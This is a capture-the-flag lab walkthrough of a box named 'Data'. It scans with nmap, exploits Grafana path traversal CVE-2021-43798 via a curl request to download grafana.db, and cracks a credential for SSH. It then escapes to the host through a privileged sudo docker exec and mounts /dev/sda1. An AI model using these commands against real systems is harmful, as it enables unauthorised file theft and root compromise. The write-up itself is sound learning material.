# Box: Data

> damiano gubiani | 16/02/2026

export the box IP

```bash
export IP='10.129.234.47'
```

# Enumeration

running nmap to enumerate open ports

## NMAP scan

command:

```bash
sudo nmap -sCV -oN nmap/all -p - -min-rate 5000 -T4 $IP -vv -Pn
```

output:

```text
Nmap scan report for 10.129.234.47 (10.129.234.47)
Host is up, received user-set (0.025s latency).
Scanned at 2026-02-16 14:11:36 CET for 25s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzybAIIzY81HLoecDz49RqTD3AAysgQcxH3XoCwJreIo17nJDB1gdyHYQERGigDVgG9hz9uB4AzJc87WXGi7TUM0r16XTLwtEX7MoMgmsXKJX/EoZGQsb1zyFnwQR00xsX2mDvHpaDeUh3EtsL1zAgxLSgi/uym4nLwjTHqpTmm0shwDqlpOvKBbL7IcQ3vVKkmy7o7TG7HYMHiDYF+Aw5BKnOTuVoMgGy3gaFXJqyhszV/6BD9UQALdrtAXKO3bO4D6g5gM9N78Om7kwRvEW3NDwvk5w+gA6wDFpMAigccCaP/JuEPoeqgV3r6cL4PovbbZkxQScY+9SuOGb78EjR
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUqvSE3W1c40BBItjgG3RCCbsMNpcqRV0DbxMh3qruh0nsNdNm9QuTflzkzqj0nxPoAmjUqq0SolF0UFHqtmEc=
|   256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPDOwcGGuUmX8fQkvfAdnPuw9tMrPSs4nai8+KMFzpvf
3000/tcp open  http    syn-ack ttl 62 Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-favicon: Unknown favicon MD5: C308E3090C62A6425B30B4C38883196B
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

we have 2 open ports

- 3000
- 22

lets enumerate the webapp

## Web App enumeration

after connecting to the webpage we found ourself to a login page

![](screen/Pasted%20image%2020260216141626.png)

looking at the botton right of the log in page we found the version of grafana

## CVE-2021-43798

after a quick search it seems that this version of grafana is vulnerable to LFI

PoC used:

> https://github.com/Jroo1053/GrafanaDirInclusion/tree/master

and after running this exploit we have a read on te host file

![](screen/Pasted%20image%2020260216142446.png)

after a quick search i found that the database for grafana are stored in /var/lib/grafana/grafana.db

so i downloaded the file to my machine

command:

```bash
curl --path-as-is -output grafana.db http://10.129.234.47:3000/public/plugins/state-timeline/../../../../../../../../../../../../var/lib/grafana/grafana.db
```

after that i used DBreaver to read the database

![](screen/Pasted%20image%2020260216145904.png)

after having the hash i search online how to decrypt it and i stumbled upon a repository on github that can help us

repo link:

> https://github.com/persees/grafana_exploits

after using the decryptor following the README.md file tutorial i found the password for the boris account and i connected to the machine via SSH

![](screen/Pasted%20image%2020260216150450.png)

lets start enumerating around

# Enumeration

as for standard enumeration i run the command sudo -l to gather information about what i can run as sudo and i got this output

![](screen/Pasted%20image%2020260216153514.png)

## PrivEsc

we can run docker exec as root , i started to search the container ID , searching online i found a ps command to find the ID 

command

```bash
ps -axf
```

output:

![](screen/Pasted%20image%2020260216153736.png)

and with that i found the container ID 

i run the docker image with full privilege

command:

```bash
sudo docker exec --user root -it --privileged e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
```

after interacting with the docker i check for potential mounting vulnerability

![](screen/Pasted%20image%2020260216154208.png)

i can see that the /dev/sda1 can be mounted on the docker so i mount it on the /mnt directory

command:

```bash
mount /dev/sda1 /mnt/host_mount
```

and after doing that i went to the root directory and i read the flag